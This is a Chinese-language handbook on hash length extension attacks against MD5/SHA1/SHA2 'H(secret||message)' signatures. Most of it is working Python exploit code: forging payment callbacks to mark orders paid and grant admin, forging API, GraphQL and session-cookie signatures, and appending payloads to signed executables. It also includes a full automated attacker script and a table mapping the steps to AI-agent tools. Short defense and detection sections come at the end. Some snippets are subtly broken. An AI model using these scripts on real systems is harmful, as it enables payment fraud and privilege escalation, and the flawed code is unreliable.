# Hash Length Extension 攻击 — 深度技术手册

> Hash Length Extension (HLE) 是 MD5/SHA1/SHA2 家族的一个结构缺陷：知道 `H(secret || message)` 后，你可以在**不知道 secret** 的情况下算出 `H(secret || message || padding || append)`。这对所有 `H(secret || message)` 构造的签名都是致命的。

## 1. 理论：为什么能扩展

### 1.1 Merkle-Damgard 结构

MD5、SHA1、SHA256 都基于 Merkle-Damgard 结构：

```
message blocks → [IV] → [compress(H0, M1)] → [compress(H1, M2)] → ... → H_final
```

关键性质：
- 输出 `H_final` 实际上就是内部状态机的最后一个 state vector
- 如果我把 `H_final` 当作新的 IV，可以在原消息后面**继续**添加数据块
- padding 已经在原消息中算过，新消息必须重新 padding

```
原始:   H(secret || message)
伪造:   H(secret || message || padding || append)
                            ^^^^^^^^^
                            由 HLE 工具自动计算正确的 padding
```

### 1.2 为什么 SHA-2 家族 (SHA256/512) 也受影响

SHA256/512 和 MD5/SHA1 一样使用 Merkle-Damgard 结构。只有 SHA-3 (Keccak) 和 BLAKE2 使用的海绵结构/HAIFA 结构天然免疫。

### 1.3 必要条件

| 条件 | 说明 |
|------|------|
| 签名 = H(secret \|\| message) | 前后拼接均受影响，前拼接最常见 |
| 已知 H(secret \|\| message) | 即签名值 |
| 已知 message | 签名的消息原文 |
| 已知 secret 长度 (或可爆破) | 通常 8-64 字节，爆破范围不大 |
| 算法是 MD5/SHA1/SHA256/SHA512 | SHA-3、BLAKE2、HMAC 免疫 |

### 1.4 长度爆破方法

```python
def brute_force_secret_len(sign_fn, message, known_sig, known_append, max_secret_len=64):
    """爆破 secret 长度：对哪个长度签名验证通过，就是"""
    import hashpumpy
    for secret_len in range(1, max_secret_len + 1):
        forged_sig, forged_msg = hashpumpy.hashpumpy(
            known_sig, message, known_append, secret_len
        )
        if sign_fn(forged_msg) == forged_sig:
            return secret_len, forged_sig, forged_msg
    return None
```

## 2. hashpumpy / hlextend 库使用

### 2.1 hashpumpy (推荐)

```bash
pip install hashpumpy
```

```python
import hashpumpy

# hashpumpy.hashpumpy(hexdigest, original_data, data_to_add, key_length, algorithm=hashlib.md5)
# 返回 (forged_hexdigest, forged_message)

# 已知: key = "secret" (长度6), message = "order=123", signature = MD5("secret" + "order=123")
# 想伪造: MD5("secret" + "order=123" + padding + "&admin=1")

original_sig = "f4b9a2d1c3e5..."  # MD5("secret" + "order=123")
forged_sig, forged_msg = hashpumpy.hashpumpy(
    original_sig,          # 已知签名（hex 字符串）
    b"order=123",          # 原始消息（bytes）
    b"&admin=1",           # 要追加的内容（bytes）
    6,                     # secret 长度（不知道就爆破）
    hashpumpy.MD5          # 算法
)

print(f"Forged sig: {forged_sig}")
print(f"Forged msg: {forged_msg}")  # 包含正确 padding 的完整消息
```

### 2.2 hlextend (纯 Python，无 C 依赖)

```bash
pip install hlextend
```

```python
import hlextend

# SHA256 扩展
sha = hlextend.new('sha256')
# 先设置原始签名和消息
# sha.extend(append, original_message, key_length, original_signature)
# sha.hexdigest() 返回新的签名

original_sig = "abc123..."  # SHA256(key + "order=123")
new_msg = sha.extend(
    b"&admin=1",      # 追加内容
    b"order=123",     # 原始消息
    6,                 # key 长度
    original_sig      # 原始签名 (HEX)
)
new_sig = sha.hexdigest()

print(f"New message (includes padding): {new_msg}")
print(f"New signature: {new_sig}")
```

### 2.3 手工实现原理（了解用）

```python
# hashpumpy 核心逻辑伪代码
def manual_length_extension(original_hash_hex, original_msg, append_data, secret_len, hash_func):
    # 1. 从 original_hash 反推内部 state
    state = bytes.fromhex(original_hash_hex)
    if hash_func == hashlib.md5:
        assert len(state) == 16  # 4 x 32-bit
        state = struct.unpack('<4I', state)
    
    # 2. 构造 padding: 如果 secret + original_msg 是完整消息，包含其 MD padding
    fake_msg = b'\x00' * secret_len + original_msg  # 替代 secret
    padding = md5_padding(len(fake_msg))  # 计算 secret + original_msg 的 padding
    
    # 3. 以 original_hash 为初始状态继续 hash append_data
    total_len = len(fake_msg) + len(padding) + len(append_data)
    new_msg_padded = append_data + md5_padding_for_new_len(total_len)
    
    # 4. 用 state 作为 IV 计算最终 hash
    new_hash = md5_compress(state, new_msg_padded)
    return new_hash, original_msg + padding + append_data
```

## 3. 支付回调签名扩展

### 3.1 场景还原

```python
"""
典型支付回调签名：
    sign = MD5(api_key + "order_id=" + order_id + "&amount=" + amount)
    
服务端验证：
    if md5(api_key + params) == received_sign:
        mark_order_paid()
        
攻击：拿到一个回调的 sign 后，可以构造：
    MD5(api_key + original_params + padding + "&status=paid&admin=1")
"""
```

### 3.2 完整利用脚本

```python
# payment_length_ext.py — 支付回调长度扩展攻击
import hashpumpy
import requests
import hashlib
import re

BASE = "https://target"
S = requests.Session()

def capture_callback_sample():
    """抓取一个合法的支付回调样本"""
    # 方法1: 从 JS/webhook 日志中找
    # 方法2: 真实支付 0.01 元获取一个有效回调
    # 方法3: 从网络请求抓包
    sample = {
        "order_id": "ORDER_2024_001",
        "amount": "0.01",
        "currency": "CNY",
        "sign": "f4b9a2d1c3e5..."  # ← 替换为抓到的真实 sign
    }
    return sample

def forge_payment_callback(sample: dict, secret_len: int = 16):
    """构造扩展后的回调"""
    # 原始参数字符串（按服务端拼接规则）
    # 假设规则: MD5(key + "order_id=X&amount=Y")
    original_msg = f"order_id={sample['order_id']}&amount={sample['amount']}"
    
    # 追加恶意参数
    append_data = "&status=paid&is_admin=true"
    
    forged_sig, forged_msg = hashpumpy.hashpumpy(
        sample['sign'],
        original_msg.encode(),
        append_data.encode(),
        secret_len,        # 需要爆破
        hashpumpy.MD5
    )
    
    # 发送伪造回调
    payload = {
        "order_id": sample['order_id'],
        "amount": sample['amount'],
        "status": "paid",
        "is_admin": "true",
        "sign": forged_sig,
        # 注意：payload 中不需要传 padding 字节
        # padding 在 sign 计算中自动包含，但不作为参数传输
    }
    
    r = S.post(BASE + "/api/payment/notify", json=payload, timeout=10)
    return r, forged_msg

def brute_and_forge(sample: dict, max_key_len: int = 64):
    """爆破 key 长度并伪造"""
    append_data = "&status=paid&is_admin=true"
    original_msg = f"order_id={sample['order_id']}&amount={sample['amount']}"
    
    for key_len in range(1, max_key_len + 1):
        forged_sig, forged_msg = hashpumpy.hashpumpy(
            sample['sign'],
            original_msg.encode(),
            append_data.encode(),
            key_len,
            hashpumpy.MD5
        )
        
        payload = {
            "order_id": sample['order_id'],
            "amount": sample['amount'],
            "status": "paid",
            "sign": forged_sig,
        }
        r = S.post(BASE + "/api/payment/notify", json=payload, timeout=10)
        
        if r.status_code == 200 and "success" in r.text.lower():
            print(f"[+] KEY LEN={key_len} → Callback accepted!")
            return key_len, forged_sig, forged_msg
        
        # 根据错误信息判断
        if "invalid sign" not in r.text.lower() and r.status_code != 403:
            print(f"[?] key_len={key_len}: status={r.status_code} msg={r.text[:200]}")
    
    return None
```

### 3.3 参数顺序变化

```python
# 不同服务端的参数拼接方式
PARAM_CONCATENATION_STYLES = [
    "key" + value1 + value2,                    # MD5(key + order_id + amount)
    "key" + "&".join(sorted_params),            # MD5(key + "amount=X&order_id=Y") 
    "key" + param_str + "&key=" + secret_key,   # 前后各一个 key (后半截已知!)
    value1 + "|" + value2 + "|" + "key",        # 分隔符在前在后影响 padding 计算
]

# 每种风格都需要对应调整 original_msg
def adjust_original_msg(style: str, params: dict, key_len: int) -> bytes:
    if style == "concat":
        # MD5(key + order_id + amount)
        return (params["order_id"] + params["amount"]).encode()
    elif style == "sorted_query":
        # MD5(key + "amount=X&order_id=Y")
        sorted_pairs = sorted(params.items())
        return ("&".join(f"{k}={v}" for k, v in sorted_pairs)).encode()
    elif style == "double_key":
        # MD5(key + params + key)
        # 注意：后半个 key 是已知的，但 padding 计算需要补在中间
        return params.encode()
    raise ValueError(f"Unknown style: {style}")

# 双 key 情况（key + message + key）
# 长度扩展仍然有效：我们只需要知道 key 长度（前半截）+ 原始 sign
# 后半截 key 会出现在 "append_data" 的位置
def double_key_extension():
    """key + message + key 场景"""
    # 原始: MD5(key + "order=123" + key)
    # 目标: MD5(key + "order=123" + padding + "&admin=1" + key)
    # 注意：key 是已知的 secret，所以 append 里要包含它
    
    key_len = 8        # 前半截 key 的长度
    key_value = b"mykey123"
    original_msg = b"order=123"
    append_data = b"&admin=1" + key_value  # 把后半截 key 拼在 append 里
    
    # 这样 hashpumpy 算出来的 sign 和消息就是正确的
    forged_sig, forged_full_msg = hashpumpy.hashpumpy(
        original_sign_hex,
        original_msg,
        append_data,
        key_len,
        hashpumpy.MD5
    )
```

## 4. API 签名扩展

### 4.1 REST API 请求签名

```python
# api_sign_extension.py — API 请求签名扩展
"""
API 签名模式：
    sign = SHA256(api_secret + method + path + body + timestamp)
    
    如果知道一个合法请求的 sign，可以扩展参数。
"""

def forge_api_request():
    """扩展 API 请求参数"""
    import hashpumpy
    
    # 已知签名示例
    original_method = "GET"
    original_path = "/api/v1/user/info"
    original_body = ""
    original_ts = "1700000000"
    original_sign = "abc123..."  # SHA256(secret + GET + /api/v1/user/info + + 1700000000)
    
    # 构造: 加入 admin 参数
    # 原始: secret + "GET/api/v1/user/info1700000000"
    # 扩展: secret + "GET/api/v1/user/info1700000000" + padding + "&admin=1"
    
    original_msg = original_method + original_path + original_body + original_ts
    
    # 尝试扩展 secret 长度
    for secret_len in range(8, 65):
        forged_sig, forged_full = hashpumpy.hashpumpy(
            original_sign,
            original_msg.encode(),
            b"&admin=1&role=superuser",
            secret_len,
            hashpumpy.SHA256
        )
        
        # 发送伪造请求（需要特定的 HTTP 库发送含 padding 的请求）
        # 注意: 请求必须发送 forged_full 包含的 padding 字节
        print(f"Try len={secret_len}: sig={forged_sig[:16]}... msg_len={len(forged_full)}")
```

### 4.2 GraphQL 签名扩展

```python
# GraphQL 查询签名扩展
GRAPHQL_SIGN_EXAMPLE = {
    "query": "query { user(id: 1) { name email } }",
    "sign": "a1b2c3d4..."
}

# 如果 sign = MD5(secret + query + operationName)
# 可以在 query 后插入恶意字段
def graphql_extension():
    original_query = "query { user(id: 1) { name email } }"
    append_query = " adminInfo { secretKey } "
    
    forged_sig, forged_full = hashpumpy.hashpumpy(
        original_sign,
        original_query.encode(),
        append_query.encode(),
        secret_len,
        hashpumpy.MD5
    )
    
    # 注意：forged_full 包含 padding 字符（通常不可见）
    # 需要 URL 编码后放在请求 body 中
    import urllib.parse
    encoded_query = urllib.parse.quote(forged_full, safe='')
```

## 5. Cookie 签名伪造 (Flask session)

### 5.1 Flask session cookie 签名流程

```python
"""
Flask 默认 session 签名：
    session_data = base64(json.dumps(data))
    sign = HMAC-SHA1(secret_key, session_data)
    
注意：Flask 用的是 HMAC，不是 H(secret + message)！
所以标准长度扩展对 Flask session **无效**。

但某些自定义 Flask session 可能自己实现了 H(secret + data) 签名：
"""

# 弱自定义 Flask session 签名检测
def check_flask_session_vulnerable(cookie: str):
    """
    检查 Flask session cookie 是否可能被长度扩展攻击
    
    安全: session=eyJhZG1pbiI6ZmFsc2V9.XYZABC_HMAC
    ── HMAC-SHA1, 免疫
    
    脆弱: session=eyJhZG1pbiI6ZmFsc2V9|MD5HASH
    ── 如果是 MD5(secret + data) 自行拼接的签名，可能被攻击
    
    脆弱: session=eyJhZG1pbiI6ZmFsc2V9.MD5HASH
    ── 类似 Flask 的自行截断，查代码确认
    """
    parts = cookie.split(".")
    if len(parts) != 2:
        parts = cookie.split("|")
    if len(parts) != 2:
        return "unknown"
    
    data_part, sig_part = parts
    try:
        import base64
        decoded = base64.urlsafe_b64decode(data_part + "==")
    except:
        pass
    
    sig_len = len(sig_part)
    if sig_len == 32:       # MD5 hex
        return "VULNERABLE" if not is_hmac(cookie) else "HMAC-MD5"
    elif sig_len == 40:     # SHA1 hex
        return "VULNERABLE" if not is_hmac(cookie) else "HMAC-SHA1"
    elif sig_len == 64:     # SHA256 hex
        return "VULNERABLE" if not is_hmac(cookie) else "HMAC-SHA256"
    return "unknown"


def forge_flask_session(old_cookie: str, secret_len: int, new_data: dict):
    """
    尝试扩展 Flask session（仅对 H(secret+data) 自定义签名有效）
    
    原理：
        原始 cookie data = base64({"admin": false})
        签名 = MD5(secret_key + data)
        扩展后 = base64(original_data + padding + '","admin":true}')
        签名 = MD5(secret_key + original_data + padding + '","admin":true}')
    """
    import hashpumpy, json, base64
    
    # 提取原始数据和签名
    parts = old_cookie.split(".")
    old_data_b64, old_sig = parts[0], parts[1]
    
    # 解码看看内容
    old_data = base64.urlsafe_b64decode(old_data_b64 + "==").decode()
    print(f"[*] Original session data: {old_data}")
    
    # 构造要追加的 JSON fragment
    # 假设原数据: {"admin":false,"user":"test"}
    # 追加: ,"admin":true,"role":"admin"}
    append = ',"admin":true,"role":"admin"}'
    
    forged_sig, forged_data = hashpumpy.hashpumpy(
        old_sig,
        old_data.encode(),
        append.encode(),
        secret_len,
        hashpumpy.MD5
    )
    
    # 重新 base64（需要去掉 padding 中的不可读字符... 但 padding 必须保留）
    import urllib.parse
    forged_data_b64 = urllib.parse.quote(base64.urlsafe_b64encode(forged_data).decode().rstrip("="))
    
    forged_cookie = f"{forged_data_b64}.{forged_sig}"
    return forged_cookie
```

## 6. 文件完整性签名的扩展攻击

### 6.1 场景

```python
"""
场景：文件完整性校验
    软件发布时提供：MD5(file_content + secret_key)
    用户验证：MD5(下载的文件 + 已知 secret) == 官方签名
    
漏洞：知道签名后，可以在文件末尾附加 payload，计算扩展后的签名
"""

def forge_file_with_payload():
    import hashpumpy
    
    # 已知一个合法文件的签名
    original_file = b"this is a legitimate program v1.0"
    original_sig = "abc123..."  # MD5(secret + original_file)
    
    # 恶意 payload
    evil_code = b'\nmalicious_code()\n'
    
    # 用 hashpumpy 扩展
    for secret_len in range(1, 33):
        forged_sig, forged_content = hashpumpy.hashpumpy(
            original_sig,
            original_file,
            evil_code,
            secret_len,
            hashpumpy.MD5
        )
        
        # forged_content = original_file + padding + evil_code
        # 用户会下载这个文件并验证签名
        # 原版的验证函数会: MD5(secret + forged_content) == forged_sig
        
        # 注意: padding 字节在文件中间，可能会破坏文件格式
        # 但对于某些格式（ZIP 注释区域、PE overlay、JPEG 尾部）可能不影响功能
        print(f"[*] Len={secret_len}: forged file size={len(forged_content)}")
```

### 6.2 文件格式兼容的扩展

```python
"""
对于某些文件格式，padding 字节在特定区域不影响功能：

1. PE 文件 overlay: 附加在 PE 尾部（超过 SizeOfImage）的字节被忽略
2. ZIP 文件: 附加在文件尾部的字节被忽略（只要 central directory 之后即可）
3. JPEG: 附加在文件尾部（after EOI marker）会被查看器忽略
4. HTML: padding 在注释中 <!-- --> 可被浏览器忽略
5. CSS/JS: padding 在注释中 /* */ 可被解释器忽略

策略：保证原始文件 + padding + payload 仍然是一个合法的文件
"""

def forge_pe_overlay_payload():
    """PE 文件 overlay 区域注入"""
    # PE 加载器只映射到 SizeOfImage，之后的字节（overlay）不会被加载
    # 但 MD5 校验会计算整个文件
    # 所以 payload 可以放在 overlay 区域而不影响 PE 执行
    
    original_pe = open("original.exe", "rb").read()
    original_sig = "..."  # 官方给的签名
    
    # payload 放在 overlay
    payload = b"\n[overlay_section]\nmalicious=code\n"
    
    forged_sig, forged_file = hashpumpy.hashpumpy(
        original_sig, original_pe, payload, secret_len, hashpumpy.MD5
    )
    
    # 验证：MD5(secret + forged_file) == forged_sig ✓
    # 同时 forged_file 中的 PE 部分完全没变，可正常运行
```

## 7. SHA-3 / BLAKE2 免疫力

### 7.1 为什么免疫

```python
"""
SHA-3 (Keccak) 使用海绵结构，BLAKE2 使用 HAIFA 结构：

                Merkle-Damgard (MD5/SHA1/SHA2)   |   Sponge (SHA-3) / HAIFA (BLAKE2)
                ──────────────────────────────────┼──────────────────────────────────
output = state  | 是的，输出就是最终内部状态       |  否，输出是状态的一部分（squeeze）
padding fixed   | 固定的 MD 风格 padding          |  不同的 padding 规则可以不同
extension       | 直接设置 IV = output 继续运行    |  不能，因为需要不同的输入率
length encoding | 只在最后一块编码                 |  每块都编码或结构不允许

结论：SHA-3 和 BLAKE2 设计的初衷之一就是防止长度扩展攻击。
"""

def demonstrate_sha3_immunity():
    """演示 SHA3-256 为什么不能被长度扩展"""
    import hashlib
    secret = b"my_secret_key"
    message = b"order=123"
    
    # 原始签名
    original_hash = hashlib.sha3_256(secret + message).hexdigest()
    
    try:
        import hashpumpy
        # 尝试扩展
        forged_sig, forged_msg = hashpumpy.hashpumpy(
            original_hash,
            message,
            b"&admin=1",
            len(secret),
            hashpumpy.SHA256  # 注意这是 SHA2-256，不是 SHA3-256
        )
        print("[*] SHA2-256 can be extended")
        
        # 尝试验证 SHA3
        real_hash = hashlib.sha3_256(secret + forged_msg).hexdigest()
        if real_hash == forged_sig:
            print("[!] SHA3-256 should NOT be extendable!")
        else:
            print("[✓] SHA3-256 immune to length extension as expected")
    except:
        pass
```

### 7.2 HMAC 免疫力

```python
"""
HMAC 构造：
    HMAC(K, m) = H((K' ⊕ opad) || H((K' ⊕ ipad) || m))

为什么免疫长度扩展：
    1. 内部 hash 输入包含 K' ⊕ ipad → 不知道 K 无法伪造
    2. 外部 hash 输入包含 K' ⊕ opad → 输出不暴露内部 state
    3. 两次哈希，无法从外部输出反推可用状态
    
检测 HMAC vs 裸 Hash：
    - HMAC 签名长度 = hash 输出长度（MD5=16, SHA1=20, SHA256=32）
    - 无法仅从长度区分 HMAC 和裸 hash
    - 但如果把 sign 当作 IV 设置后继续 hash 不成立 → HMAC
"""
```

## 8. 检测与指纹识别

### 8.1 签名长度快速识别

```python
# sig_fingerprint_by_length.py
SIGNATURE_LENGTH_LOOKUP = {
    32:  ["MD5", "MD4", "MD2", "NTLM", "LM"],
    40:  ["SHA1", "RIPEMD-160", "HAS-160"],
    48:  ["SHA-384", "SHA2-384", "BLAKE2b-384"],
    56:  ["SHA-224", "SHA2-224", "SHA3-224"],
    64:  ["SHA-256", "SHA2-256", "SHA3-256", "BLAKE2s-256", "BLAKE2b-256"],
    96:  ["SHA-512/224", "SHA2-512/224"],
    128: ["SHA-512", "SHA2-512", "SHA3-512", "BLAKE2b-512"],
}

def fingerprint_signature(sig_hex: str) -> list:
    """识别签名可能的算法"""
    length = len(sig_hex)
    return SIGNATURE_LENGTH_LOOKUP.get(length, ["unknown"])

# 如果签名 = 32/40/64 hex chars → 可能是 MD5/SHA1/SHA256 → 检查裸 hash 还是 HMAC
# 裸 hash 且构造是 H(secret + data) → VULNERABLE!
```

### 8.2 验证扩展可行性的探测脚本

```python
# probe_length_extension.py
import requests, hashlib, hashpumpy

def probe_hle_vulnerability(url: str, known_params: dict, known_sign: str, sign_field: str = "sign"):
    """
    探测目标是否受长度扩展影响
    
    方法：
    1. 发送原始合法请求 → 确认成功
    2. 构造一个参数被扩展的请求 → 如果也被接受，则存在 HLE
    """
    s = requests.Session()
    
    # Step 1: 确认原始请求有效
    r1 = s.post(url, json={**known_params, sign_field: known_sign})
    baseline_ok = r1.status_code == 200 and "error" not in r1.text.lower()
    print(f"[*] Baseline request valid: {baseline_ok}")
    
    if not baseline_ok:
        print("[-] Cannot validate baseline")
        return False
    
    # Step 2: 构造扩展参数（不加任何新参数，只加 padding）
    # 用空 append 测试：扩展的「空」消息签名应该和原始相同
    for key_len in range(1, 65, 4):  # step 4 加速
        # 找到原始参数字符串构造方式
        param_string = "&".join(f"{k}={v}" for k, v in known_params.items() if k != sign_field)
        
        try:
            forged_sig, forged_full = hashpumpy.hashpumpy(
                known_sign,
                param_string.encode(),
                b"",   # 空 append，只测 padding 是否被接受
                key_len,
                hashpumpy.MD5
            )
            
            # 如果原始请求已经是 H(secret+params)，那么空扩展的签名应该不同
            # 因为原始 sign 不包含 padding
            if forged_sig == known_sign:
                continue  # 这个 key_len 不匹配
            
            # 发送「空扩展」请求
            r2 = s.post(url, json={
                **known_params,
                "extra": "test",  # 不含 padding，只测 sign 构造
                sign_field: forged_sig
            })
            
            if r2.status_code == 200 and "success" in r2.text.lower():
                print(f"[+] HLE CONFIRMED at key_len={key_len}!")
                print(f"[+] Original sign: {known_sign}")
                print(f"[+] Forged sign:   {forged_sig}")
                return True, key_len
                
        except Exception as e:
            pass
    
    print("[-] No HLE vulnerability detected")
    return False
```

## 9. 完整 Python 攻击脚本

```python
#!/usr/bin/env python3
# length_extension_exploit.py — 完整攻击脚本
"""
用法：
    1. 设置目标信息
    2. 脚本自动检测签名算法
    3. 爆破 secret 长度
    4. 构造扩展攻击
    5. 验证并输出 flag
"""

import requests
import hashlib
import hashpumpy
import sys
import re
import urllib.parse
from typing import Optional, Tuple, List

class LengthExtensionExploit:
    """Hash Length Extension 全自动攻击器"""
    
    def __init__(self, base_url: str):
        self.base = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Mozilla/5.0"})
        self.secret_len = None
        self.algorithm = None
        
        # 常见参数拼接风格
        self.param_styles = {
            "concat": lambda params: "".join(str(v) for v in params.values()),
            "sorted_query": lambda params: "&".join(
                f"{k}={v}" for k, v in sorted(params.items()) if k != "sign"
            ),
            "unsorted_query": lambda params: "&".join(
                f"{k}={v}" for k, v in params.items() if k != "sign"
            ),
        }
    
    def detect_algorithm(self, sample_sign: str) -> str:
        """从签名长度推断算法"""
        sig_len = len(sample_sign)
        algo_map = {
            32: hashpumpy.MD5,
            40: hashpumpy.SHA1,
            64: hashpumpy.SHA256,
            128: hashpumpy.SHA512,
        }
        if sig_len in algo_map:
            self.algorithm = algo_map[sig_len]
            name_map = {32: "MD5", 40: "SHA1", 64: "SHA256", 128: "SHA512"}
            print(f"[*] Detected algorithm: {name_map[sig_len]} (len={sig_len})")
            return name_map[sig_len]
        raise ValueError(f"Unknown signature length: {sig_len}")
    
    def brute_secret_length(
        self,
        original_params: dict,
        original_sign: str,
        append_params: dict,
        sign_field: str = "sign",
        notify_url: str = "/api/payment/notify",
        max_len: int = 64
    ) -> Optional[int]:
        """爆破 secret 长度"""
        if not self.algorithm:
            self.detect_algorithm(original_sign)
        
        # 构造参数字符串（需要知道服务端的拼接方式）
        for style_name, style_fn in self.param_styles.items():
            original_msg = style_fn(original_params)
            append_msg = style_fn(append_params)
            
            print(f"[*] Trying param style: {style_name}")
            print(f"[*] Original msg: {original_msg}")
            print(f"[*] Append msg:   {append_msg}")
            
            for key_len in range(1, max_len + 1):
                try:
                    forged_sig, forged_full = hashpumpy.hashpumpy(
                        original_sign,
                        original_msg.encode(),
                        append_msg.encode(),
                        key_len,
                        self.algorithm
                    )
                    
                    # 构造发送 payload
                    # 注意：某些字段需要把 padding 包含在请求中
                    # 但大多数回调接口只验证 sign，不需要发 padding 数据
                    payload = {
                        **original_params,
                        **append_params,
                        sign_field: forged_sig,
                    }
                    
                    r = self.session.post(
                        self.base + notify_url,
                        json=payload,
                        timeout=10
                    )
                    
                    if r.status_code == 200:
                        body = r.text.lower()
                        if "success" in body or "ok" in body or "paid" in body:
                            self.secret_len = key_len
                            print(f"\n[+] SUCCESS! secret_len={key_len}")
                            print(f"[+] Style: {style_name}")
                            print(f"[+] Forged sign: {forged_sig}")
                            return key_len
                        
                except Exception as e:
                    pass
        
        return None
    
    def forge_and_send(
        self,
        original_params: dict,
        original_sign: str,
        append_params: dict,
        sign_field: str = "sign",
        notify_url: str = "/api/payment/notify",
        key_len: int = None
    ) -> requests.Response:
        """直接伪造并发送"""
        if not self.algorithm:
            self.detect_algorithm(original_sign)
        
        key_len = key_len or self.secret_len
        if not key_len:
            raise ValueError("secret_len unknown, run brute_secret_length first")
        
        original_msg = "&".join(f"{k}={v}" for k, v in sorted(original_params.items()) if k != sign_field)
        append_msg = "&".join(f"{k}={v}" for k, v in append_params.items())
        
        forged_sig, forged_full = hashpumpy.hashpumpy(
            original_sign,
            original_msg.encode(),
            append_msg.encode(),
            key_len,
            self.algorithm
        )
        
        payload = {
            **original_params,
            **append_params,
            sign_field: forged_sig,
        }
        
        r = self.session.post(
            self.base + notify_url,
            json=payload,
            timeout=10
        )
        
        print(f"[*] Sent forged callback: {payload}")
        print(f"[*] Response: {r.status_code} | {r.text[:300]}")
        
        # 自动提取 flag
        flags = re.findall(r'flag\{[^}]+\}', r.text)
        if flags:
            print(f"\n[🏴 FLAG] {flags}")
        
        return r


if __name__ == "__main__":
    # ======= 配置区 =======
    BASE = "https://target-ctf.com"
    
    # 从抓包/JS 分析中获取的合法签名示例
    SAMPLE_SIGN = "f4b9a2d1c3e5f6a7b8c9d0e1f2a3b4c5"  # MD5 hex
    SAMPLE_PARAMS = {
        "order_id": "ORD_001",
        "amount": "100.00",
        "currency": "CNY",
    }
    
    # 要追加的参数
    APPEND_PARAMS = {
        "status": "paid",
        "is_admin": "true",
    }
    
    # ======= 攻击执行 =======
    exploit = LengthExtensionExploit(BASE)
    
    # Step 1: 检测算法
    algo = exploit.detect_algorithm(SAMPLE_SIGN)
    
    # Step 2: 爆破 secret 长度
    key_len = exploit.brute_secret_length(
        SAMPLE_PARAMS,
        SAMPLE_SIGN,
        APPEND_PARAMS
    )
    
    if key_len:
        # Step 3: 伪造回调
        r = exploit.forge_and_send(
            SAMPLE_PARAMS,
            SAMPLE_SIGN,
            APPEND_PARAMS
        )
        
        print(f"\n[*] Final result: accepted={r.status_code == 200}")
    else:
        print("[-] Could not find valid secret length")
        print("[*] Try: different param style, longer max_len, different endpoint")
```

## 10. 检测与防御

### 10.1 服务端防御方案

```python
"""
防御 hash length extension 的方法：

1. 使用 HMAC 替代裸 Hash：
   安全:   HMAC-MD5(secret, message)
            = MD5((secret ⊕ opad) || MD5((secret ⊕ ipad) || message))
   不安全: MD5(secret || message)
   注意：不要自己实现「类 HMAC」，直接用标准 HMAC

2. 使用 SHA-3 / BLAKE2：
   SHA3-256(secret || message) → 免疫长度扩展
   BLAKE2(secret, message)     → 免疫长度扩展

3. 使用后拼接（但仍然不安全，见下）：
   H(message || secret) → 理论上可被扩展（padding 在 message 后）
   但实际利用更困难，需要控制 message 结尾

4. 双重哈希：
   MD5(MD5(secret || message)) → 免疫！
   外层 hash 的输入是固定长度，无法再扩展

5. 固定前缀 + 分隔符：
   MD5("fixed_prefix" + "|" + message) → 如果"fixed_prefix"是已知的
   攻击者可以用它作为起点重新计算（但不知道 secret）
"""

def detect_vulnerable_sign_construction(source_code: str) -> bool:
    """检测易受 HLE 攻击的签名构造"""
    patterns = [
        r'md5\(\s*\$secret\s*\.\s*\$data\s*\)',
        r'md5\(\s*\$data\s*\.\s*\$secret\s*\)',
        r"hashlib\.md5\(\s*secret\s*\+\s*message\s*\)",
        r'MessageDigest\.getInstance\("MD5"\).*update\(secret\).*update\(data\)',
        r'SHA256\(secret \+ data\)',
        r'hash\(\s*\'sha256\'\s*,\s*\$secret\s*\.\s*\$data\s*\)',
    ]
    for pattern in patterns:
        if re.search(pattern, source_code):
            return True
    return False
```

### 10.2 攻击检测

```python
def detect_length_extension_attack(request_params: dict) -> bool:
    """
    检测是否有人在尝试 HLE 攻击
    
    特征：
    1. 参数值中含有不可打印的 padding 字节
    2. 同一个参数的 sign 构造不同于正常请求
    3. 参数值中包含 MD padding 的尾端（\x80 + \x00 序列）
    """
    suspicious = False
    
    for key, value in request_params.items():
        if isinstance(value, str):
            # 检查是否有不可打印字符（padding 包含 \x80 和大量 \x00）
            binary = value.encode('utf-8', errors='replace')
            non_printable = sum(1 for b in binary if b < 32 and b not in (9, 10, 13))
            
            if non_printable > 10:  # padding 通常有很多 \x00
                print(f"[!] Suspicious non-printable chars in {key}: {non_printable}")
                suspicious = True
            
            # 检查是否包含 \x80（MD padding 的开始标记）
            if b'\x80' in binary:
                print(f"[!] Possible MD padding marker in {key}")
                suspicious = True
    
    return suspicious
```

## 11. 常见 CTF 场景速查

| 场景 | 线索 | 攻击要点 |
|------|------|----------|
| 支付回调 | `sign=MD5(key+order_id+amount)` | 扩展 status=paid |
| API 认证 | `X-Sign: SHA256(apisecret+timestamp+path)` | 扩展 &admin=true |
| 文件签名 | 下载页面提供 MD5 签名 | 文件尾部追加 payload |
| Cookie 签名 | 格式 `data|sign` | 检查是否 HMAC |
| URL 签名 | `?token=MD5(secret+path)` | 扩展路径参数 |
| JWT 类似 | 自实现 signature | 检查算法是否为裸 hash |

## 12. 参考

- [hashpumpy GitHub](https://github.com/bwall/hashpumpy)
- [hlextend PyPI](https://pypi.org/project/hlextend/)
- Flask session 安全 (HMAC): HMAC 模式下免疫
- SHA-3 规范: FIPS 202 (海绵结构)
- BLAKE2 RFC 7693

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 长度扩展攻击探测 | `http_probe` | HTTP GET 探测长度扩展攻击入口 |
| 知识检索 | `kb_router` | 按长度扩展攻击信号搜索知识库 |
